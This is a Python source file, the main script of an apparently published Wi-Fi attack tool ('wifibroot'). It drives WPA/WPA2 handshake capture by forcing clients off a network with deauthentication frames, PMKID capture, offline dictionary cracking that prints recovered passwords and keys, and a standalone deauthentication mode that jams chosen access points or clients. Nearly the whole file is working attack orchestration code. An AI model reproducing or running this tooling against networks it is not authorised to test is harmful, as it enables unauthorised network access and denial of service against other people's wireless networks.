from __future__ import print_function
# hash3lizer/wifibroot.py
# Twitter: @hash3liZer
# Website: https://www.shellvoide.com
# Email: admin@shellvoide.com
#############################

import optparse
import os
import sys
import re
import subprocess
import threading
import time
import random
import exceptions
from pull import Pully
from screen import Display
from signal import signal, SIGINT, getsignal
from wireless import Shifter
from wireless import Sniper
from wireless import PSK
from wireless import eAPoL
from wireless import PMKID
from wireless import CAPTURE_PMKID
from wireless import CAPTURE_HAND
from wireless import DEAUTH
from scapy.utils import rdpcap
from scapy.utils import PcapWriter
from utils import tabulate
from utils import org
from utils import Modes

WRITE__ = ''
DICTIONARY = ''
V__ = bool(0)
_KEY_ = None
_HANDLER = getsignal(SIGINT)
_HANDSHAKE = ''

class interface:

	stop_hopper = 0
	__STATUS_END = 0
	cch = 1

	def __init__(self, iface):
		self.iface = iface
		self.interfaces = self.list_ifaces()
		self.check_help = ''
		self.check_man = self.check_man()
		self.check_mon = self.check_mon()

	def check_man(self):
		if self.is_iface(self.iface):
			if self.is_man(self.iface):
				return True
			else:
				self.check_help = "Wireless interface isn't in Managed Mode"
				return False
		else:
			self.check_help = "There's no such interface: %s" % (self.iface)
			return False

	def check_mon(self):
		if self.is_iface(self.iface):
			if self.is_mon(self.iface):
				return True
			else:
				self.check_help = "Wireless interface isn't in Monitor Mode"
				return False
		else:
			self.check_help = "There's no such interface: %s" % (self.iface)
			return False

	def list_ifaces(self):
		ifaces = []
		dev = open('/proc/net/dev', 'r')
		data = dev.read()
		for facecard in re.findall('[a-zA-Z0-9]+:', data):
			ifaces.append(facecard.rstrip(":"))
		dev.close()
		return ifaces

	def is_iface(self, iface):
		if iface in self.interfaces:
			return True
		else:
			return False

	def is_mon(self, iface):
		co = subprocess.Popen(['iwconfig', iface], stdout=subprocess.PIPE)
		data = co.communicate()[0]
		card = re.findall('Mode:[A-Za-z]+', data)[0]
		if "Monitor" in card:
			return True
		else:
			return False

	def is_man(self, iface):
		co = subprocess.Popen(['iwconfig', iface], stdout=subprocess.PIPE)
		data = co.communicate()[0]
		card = re.findall('Mode:[A-Za-z]+', data)[0]
		if "Managed" in card:
			return True
		else:
			return False

	def put_channel(self, ch):
		os.system('iwconfig %s channel %s' % (self.iface, ch))
		self.cch = int(ch)
		return ch

	def hopper(self):
		#if subprocess.call(['sudo','iwconfig'], stdout=subprocess.PIPE, stderr=subprocess.PIPE) != 0:
		#	pull.error('iwconfig not found. Make sure it is installed and you have neccassery privileges')
		#	sys.exit(-1)
		thread = threading.Thread(target=self.hop_channels, name="hopper")
		thread.daemon = True
		thread.start()

	def hop_channels(self):
		n = 1
		while not self.stop_hopper:
			self.cch = n
			time.sleep(0.40)
			os.system('iwconfig %s channel %d' % (self.iface, n))
			dig = int(random.random() * 14)
			if dig != 0 and dig != n:
				n = dig
		self.__STATUS_END = 1

	def shift_channel(self, ch):
		os.system('iwconfig %s channel %d' % (self.iface, ch))
		return ch

	def put_mon(self):
		pass

	def put_man(self):
		pass

class Sniffer:

	WiFiAP = []

	def __init__(self, iface, bssid=None, essid=None):
		self.iface1 = iface
		self.bssid = bssid
		self.essid = essid
		self.shift = Shifter(self.iface1.iface, self.bssid, self.essid, V__)
		signal(SIGINT, self.break_shifter)
		self.aps()

	def aps(self):
		pull.up('Scanning! Press [CTRL+C] to stop.')
		time.sleep(1)
		self.screen = Display(V__)
		thread = threading.Thread(target=self.screen.Shifter, args=(self.shift, self.iface1,), name="Verbose Sniffer")
		thread.daemon = True
		thread.start()
		self.shift.run()

	def break_shifter(self, sig, frame):
		self.screen.shifter_break = True
		while not self.screen.Shifter_stopped:
			pass
		self.screen.clear()
		del self.screen
		signal( SIGINT, _HANDLER )

		if V__:
			__HEADERS = [pull.BOLD+'NO', 'ESSID', 'PWR', 'ENC', 'CIPHER', 'AUTH', 'CH', 'BSSID', 'VENDOR', 'CL'+pull.END]
		else:
			__HEADERS = [pull.BOLD+'NO', 'ESSID', 'PWR', 'ENC', 'CIPHER', 'AUTH', 'CH', 'BSSID'+pull.END]
		tabulator__ = []
		###
		__sig_LIST = []
		for ap in self.shift.results():
			__sig_LIST.append(ap['pwr'])
		__sig_LIST = sorted(__sig_LIST, reverse=True)
		###
		count = 1
		for sig in __sig_LIST:
			for ap in self.shift.results():
				if ap['pwr'] == sig:
					ap['count'] = count
					count += 1; self.shift.results().remove(ap)
					self.WiFiAP.append(ap)
		###
		for ap in self.WiFiAP:
			if V__:
				tabulator__.append([ap['count'], pull.GREEN+ap['essid']+pull.END, ap['pwr'], ap['auth'], ap['cipher'], \
						ap['psk'], ap['channel'], ap['bssid'].upper(), pull.DARKCYAN+ap['vendor']+pull.END, ap['clients'] ])
			else:
				tabulator__.append([ap['count'], pull.GREEN+ap['essid']+pull.END, ap['pwr'], ap['auth'], ap['cipher'], \
						ap['psk'], ap['channel'], ap['bssid'].upper()])
		print("\n"+tabulate(tabulator__, headers=__HEADERS)+"\n")
		os.kill(os.getpid(), SIGINT)

class pmkid_GEN:

	def __init__(self, iface_instance, ap_instance, no_frames):
		self.ap_instance = ap_instance
		self.iface_instance = iface_instance
		self.pmkid = PMKID(self.ap_instance['bssid'], self.ap_instance['essid'], self.iface_instance.iface, self.ap_instance['beacon'],\
								 DICTIONARY, _KEY_, pull, V__, no_frames)
		self.channel = self.channel(self.ap_instance['channel'])

	def is_version2(self):
		if 'wpa2' in self.ap_instance['auth'].lower():
			return True
		else:
			return False

	def auth_gen(self):
		to_return = self.pmkid.dev_conn()
		self.pmkid._PMKID__AUTH_STEP = False
		return to_return

	def asso_gen(self):
		_PACT = False
		while not _PACT:
			_PACT = self.pmkid.asso_conn()
			if not _PACT:   # When Error was detected. 
				pull.special("Times Up! Attempting to authenticate with Access Point.")
				self.auth_gen()
		return _PACT

	def lets_crack(self):
		_pass, _hash, _hash_ = self.pmkid.crack( WRITE__ )
		if _pass is None:
			pull.error("Password Not Found in Dictionary. Try enlarging it!")
			sys.exit()
		else:
			pull.use("Password Found: %s%s%s" % (pull.BOLD, _pass, pull.END))
			if V__:
				pull.right("PMKID: ")
				print(_hash_)
				pull.right("PMK: ")
				print(_hash)

	def channel(self, _ch):
		self.iface_instance.put_channel(_ch)
		return _ch

class Phazer:

	THEPOL = ()

	def __init__(self, sniffer):
		self.iface = sniffer.iface1
		self.WiFiAP = sniffer.WiFiAP

	def count_input(self):
		while True:
			try:
				count = pull.question('Enter Your Target Number [q]uit/[n]: ')
				return count
			except:
				pass

	def get_input(self):
		while True:
			count = self.count_input()
			if count == 'q' or count == 'Q':
				sys.exit(0)
			for AP in self.WiFiAP:
				if str(AP['count']) == count:
					return AP

	def clients_sniff(self, _bss, _ess, _ch, _tm):
		_clip = Sniper(self.iface, _bss, _ess, _ch, _tm, pull, V__)
		pull.info("Scanning for Access Point Stations. Press [CTRL+C] to Stop.")
		signal(SIGINT, _HANDLER)
		_clip.cl_generator()
		signal(SIGINT, grace_exit)
		return _clip.clients()

	def save(self):
		global WRITE__
		
		if WRITE__:
			_wr = PcapWriter(WRITE__, append=False, sync=True)
			_wr.write(self.THEPOL)
			pull.use("Handshake >> [%s] Count [%s] %s[Saved]%s" % (pull.DARKCYAN+WRITE__+pull.END, str(len(self.THEPOL)), pull.GREEN, pull.END ))
		else:
			pull.error("Handshake not saved. Use -w, --write for saving handshakes. ")

	def crack_shoot(self, _tgt, _hd=False):
		if not _hd:
			self.save()

		_crk = PSK(self.THEPOL, _tgt['essid'], _tgt['auth'], DICTIONARY, V__, _KEY_)
		_pass, _pmk, _ptk, _mic = _crk.broot()

		if _pass:
			pull.use("Found: %s" % (_pass))
			pull.right("PMK: "); print(_pmk)
			pull.right("PTK: "); print(_ptk)
			pull.right("MIC: "); print(_mic)

		else:
			pull.error("Password not Found! Try enlarging your dictionary!")
			sys.exit(0)

		return 

	def sniper_shoot(self, _bss, _ess, _ch, _clients, _tm, _deauth):
		pull.info("Time Interval [%s] -> Implies Gap b/w Frames is %d" % (pull.DARKCYAN+str(_tm)+pull.END, _tm))
		_snip = Sniper(self.iface, _bss, _ess, _ch, _tm, pull, V__)
		for _ap, _cls in _clients.items():
			if _ap == _bss:
				while not len(self.THEPOL) >= 4:
					for _cl, _pwr in _cls:
						if V__:
							pull.up("%i-> %s (%s) %s><%s %s (%s) %s[Deauthentication]%s" % (_deauth, _cl.replace(':', '').upper(), pull.DARKCYAN+org(_cl).org+pull.END,\
									pull.RED, pull.END, _bss.replace(':', '').upper(), pull.DARKCYAN+org(_bss).org+pull.END, pull.RED, pull.END))
						else:
							pull.up("%i-> %s %s><%s %s %s[Deauthentication]%s" % (_deauth, _cl.replace(':', '').upper(),\
									pull.RED, pull.END, _bss.replace(':', '').upper(), pull.RED, pull.END))
						_sht = threading.Thread(target=_snip.shoot, args=(_cl, _deauth, self), name="T Shooter")
						_sht.daemon = True
						_sht.start();
					time.sleep(_tm)
				pull.use("Handshake %s (%s) %s[Captured]%s" % (_bss.replace(':', '').upper(), pull.DARKCYAN+org(_bss).org+pull.END, \
																pull.GREEN, pull.END)); break

class Moder:

	def __init__(self, _n, _sniff=None, _int=None):
		self.mode = _n
		self.interface_inst = _int
		self._sniff = _sniff

	def hand_mode_ext(self, _tgt, _ph):
		pull.up("Verifying... Looking for %s[4 EAPOLs]%s" % (pull.BLUE, pull.END))
		_eap = eAPoL(_tgt['bssid'])
		_pkts = rdpcap(_HANDSHAKE); _valid = False

		for pkt in _pkts:
			_yorn = _eap.check(pkt)
			if _yorn:
				_valid = True; break

		if _valid:
			_ph.THEPOL = _eap.get_pols()
			_ph.crack_shoot(_tgt, True)
		else:
			self.pull.error("Handshake not Found. Please provide a valid handshake!")


	def hand_mode(self, _ph ,_tgt, _tm, _deauth):
		if 'WPA' in _tgt['auth']:
			self.interface_inst.stop_hopper = 1; time.sleep(1)
			self.interface_inst.put_channel(_tgt['channel'])
			if not _HANDSHAKE:
				pull.info("Changing Channel to %s %s[SuccessFul]%s" % (_tgt['channel'], pull.GREEN, pull.END))
				_cls = self._sniff.shift._Shifter__ALSA_CLIENTS
				_yorn = pull.question("AP Clients %s[%s]%s Scan Further?[Y/n] " % (pull.YELLOW, _tgt['clients'], pull.END))
				if _yorn == 'y' or _yorn == 'Y':
					_cls = _ph.clients_sniff(_tgt['bssid'], _tgt['essid'], _tgt['channel'], _tm)
				if len(_cls) >= 1:
					_ph.sniper_shoot(_tgt['bssid'], _tgt['essid'], _tgt['channel'], _cls, _tm, _deauth)
					_ph.crack_shoot(_tgt)
				else:
					pull.special("Found Clients [0]. Shutting Down!")
					sys.exit(1)
			else:
				self.hand_mode_ext(_tgt, _ph)
		else:
			pull.special("The specified mode can only be used for WPA/WPA2 Networks")
			sys.exit(-1)

	def crack_mode(self, _type, _file, _ess):
		if _type == 1:
			_capture = CAPTURE_HAND(pull, _file, DICTIONARY, _ess, V__)
			if _capture.verify():
				_capture.organize()
				_capture.loop()
			else:
				pull.error("Invalid Capture! Are you sure this is the valid capture?")
				sys.exit(-1)
		elif _type == 2:
			_capture = CAPTURE_PMKID(pull, _file, DICTIONARY, V__)
			if _capture.verify():
				_capture.organize()
				_capture.loop()
			else:
				pull.error("Invalid Capture! Are you sure this is the valid capture?")
				sys.exit(-1)

	def silent_deauth_mode(self, iface, _deauth, _ap, _cl, _count):
		_silent = DEAUTH(iface.iface, _deauth, _ap, _cl, _count, pull, V__)
		_silent.locate()
		if _silent.verify():
			_silent.jam()
		else:
			pull.error("Not able to Find such network %s[%s]%s" % (pull.RED, _ap.replace(':', '').upper(), pull.END )); sys.exit(-1)
			

##########################
#    DIRECT FUNCTIONS
##########################

def grace_exit(sig, frame):
	pull.special("Closing. Cleaning up the mess! ")
	time.sleep(0.50)
	sys.exit(0)

def _writer(options):
	if options.write != None:
		if os.path.isfile(options.write):
			pull.special("File Already Exists! %s[%s]%s" % (pull.RED, options.write, pull.END))
			sys.exit(-1)
		else:
			return options.write
	else:
		return str()

def _handshake(options):
	if options.handshake != None:
		if os.path.isfile(options.handshake):
			return options.handshake
		else:
			pull.error("No such File %s[%s]%s" % (pull.RED, options.handshake, pull.END))
			sys.exit(-1)
	else:
		return str()

def _wordlister(options):
	if options.dictionary == None:
		pull.error("No dictionary was provided. Use -h or --help for more information. ")
		sys.exit(-1)
	else:
		if os.path.isfile(options.dictionary):
			_lns = open(options.dictionary).read().splitlines()
			pull.info("Path: {%s} Lines {%s}" % (pull.BLUE+options.dictionary+pull.END, pull.BLUE+str(len(_lns))+pull.END))
			return options.dictionary
		else:
			pull.error('No such File: %s' % (options.dictionary))
			sys.exit(-1)

def _typer(options):
	if not options.type == None:
		if options.type == 'handshake':
			return 1
		elif options.type == 'pmkid':
			return 2
		else:
			pull.error('Unknown Captured type specifed. Use --list-types option to see the list.'); sys.exit(-1)
	else:
		pull.special("No Capture Type Specified. See the manual (-h, --help)"); sys.exit(-1)

def _channel_verifier(ch):
	__channels = (1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14)
	if ch in __channels:
		return ch
	else:
		return False

def _channeler(options):
	if options.interface != None:
		iface = interface(options.interface)
		if iface.check_mon == False:
			pull.error(iface.check_help)
			sys.exit(-1)
		if options.channel == None:
			pull.special("Channel Specified: %s Hopper Status [%s]" % (pull.RED+"NONE"+pull.END, pull.GREEN+"Running"+pull.END))
			iface.hopper()
		else:
			if _channel_verifier(options.channel):
				iface.put_channel(options.channel)
				pull.info("Channel Specified: %s Hopper Status [%s]" % (pull.GREEN+str(options.channel)+pull.END, pull.GREEN+"Stopped"+pull.END))
			else:
				pull.special('Invalid Channel Detected! Hopper Status [%s]' % (pull.GREEN+"Running"+pull.END))
				iface.hopper()
		return iface
	else:
		pull.error('Interface Required. Please supply -i argument.')
		sys.exit(-1)

def _silfer(iface, options):
	if options.essid != None or options.bssid != None:
		if options.essid != None and options.bssid != None:
			sniffer = Sniffer(iface, options.bssid, options.essid)
		elif options.bssid != None:
			sniffer = Sniffer(iface, bssid=options.bssid)
		elif options.essid != None:
			sniffer = Sniffer(iface, essid=options.essid)
	else:
		sniffer = Sniffer(iface)

	return sniffer

def _crack_filer(options):
	if options.read == None:
		pull.special("Please Specify your capture path. See manual!"); sys.exit(-1)
	else:
		_file = options.read
		if os.path.isfile(_file):
			return _file
		else:
			pull.special("No Such File: %s[%s]%s" % (pull.RED, _file, pull.END)); sys.exit(-1)

def _detargeter(options):
	_ap, _cl = '', ''
	if options.ap:
		if re.match("^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})", options.ap, re.I):
			_ap = options.ap
		else:
			pull.error("Not a Valid MAC address for Access Point!"); sys.exit(-1)
	if options.client:
		if re.match("^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})", options.client, re.I):
			_cl = options.client
		else:
			pull.error("Not a Valid MAC address for STA!"); sys.exit(-1)
	return _ap.lower(), _cl.lower()

def _deauth_counter(options):
	if options.deauthcount is None:
		pull.error("How much frames you want to send? Specify -0/--count option."); sys.exit(-1)

def main():
	global WRITE__, DICTIONARY, NEW_HAND, V__, _KEY_, _HANDSHAKE
	global _CRACK

	parser = optparse.OptionParser(add_help_option=False)
	parser.add_option('-h', '--help', dest='help', default=False, action="store_true", help="Show this help manual")
	parser.add_option('-m', '--mode', dest='mode', type='int', help="Mode to Use. ")
	parser.add_option('-i', '--interface', dest="interface", type='string', help="Monitor Wireless Interface to use")
	parser.add_option('-e', '--essid', dest="essid", type='string', help="Targets AP's with the specified ESSIDs")
	parser.add_option('-b', '--bssid', dest="bssid", type='string', help="Targets AP's with the specified BSSIDs")
	parser.add_option('-c', '--channel', dest="channel", type='int', help="Listen on specified channel.")
	parser.add_option('-d', '--dictionary', dest='dictionary', type='string', help="Dictionary containing Passwords")
	parser.add_option('-w', '--write', dest='write', type='string', help="Write Data to a file. ")
	parser.add_option('-t', '--timeout', dest="timeout", default=15, type='int', help="Specify timeout for locating target clients. ")
	parser.add_option('-v', '--verbose', dest="verbose", default=True, action="store_true", help="Print hashes and verbose messages. ")
	parser.add_option('', '--handshake', dest='handshake',type='string', help='Handshake to use, instead of dissociating')
	parser.add_option('', '--deauth', dest='deauth', type='int', default=32, help="Deauth Packets to send.")
	parser.add_option('', '--frames', dest='frames', type='int', default=0, help="Number of Auth and Association Frames")
	parser.add_option('', '--type', dest='type', type='string', help="Type of Cracking")
	parser.add_option('', '--list-types', dest='listTypes', default=False, action="store_true", help="List of Available types")
	parser.add_option('-r', '--read', dest='read', type='string', help='Read capture in mode 3')
	
	parser.add_option('', '--ap', dest='ap', type="string", help="Access Point BSSID")
	parser.add_option('', '--client', dest='client', type="string", help="STA (Client) BSSID")
	parser.add_option('-0', '--count', dest='deauthcount', type="int", help="Number of Deauth Frames to Send")
	
	(options, args) = parser.parse_args()

	if options.help and not(options.mode):
		pull.modes()
		sys.exit(0)

	if options.verbose == True:
		V__ = bool(1)

	if not Modes().get_mode(options.mode):
		pull.special("No Mode Specified! Use -h, --help option to see available modes.")
		sys.exit(-1)

	if options.mode == 1:
		if options.help:
			pull.help(1); sys.exit(0)
		WRITE__ = _writer(options); _HANDSHAKE = _handshake(options); DICTIONARY = _wordlister(options)
		iface = _channeler(options); _silf = _silfer(iface, options)
		phaser = Phazer(_silf); _tgt = phaser.get_input(); signal(SIGINT, grace_exit)
		_modler = Moder(options.mode, _silf, iface)
		_modler.hand_mode(phaser, _tgt, options.timeout, options.deauth)

	elif options.mode == 2:
		if options.help:
			pull.help(2); sys.exit(0)
		WRITE__ = _writer(options); DICTIONARY = _wordlister(options)
		iface = _channeler(options); _silf = _silfer(iface, options)
		pmk = pmkid_GEN(iface, Phazer(_silf).get_input(), options.frames)
		signal(SIGINT, grace_exit)
		if pmk.is_version2():
			if pmk.auth_gen():
				if pmk.asso_gen():
					pmk.lets_crack()
		else:
			pull.special("This attack only works for WPA2 networks")
			sys.exit(0)

	elif options.mode == 3:
		if options.help:
			pull.help(3); sys.exit(0)
		if options.listTypes:
			pull.listTypes(); sys.exit(0)
		_type = _typer(options); DICTIONARY = _wordlister(options); _file = _crack_filer(options)
		_modler = Moder(options.mode)
		_modler.crack_mode(_type, _file, options.essid)

	elif options.mode == 4:
		if options.help:
			pull.help(4); sys.exit(0)
		iface = _channeler(options); _modler = Moder(options.mode); _deauth_counter(options)
		signal(SIGINT, grace_exit)
		_tgt = _detargeter(options); _modler.silent_deauth_mode(iface, options.deauth, _tgt[0], _tgt[1], options.deauthcount)


if __name__ == "__main__":
	pull = Pully()
	pull.logo()
	main()
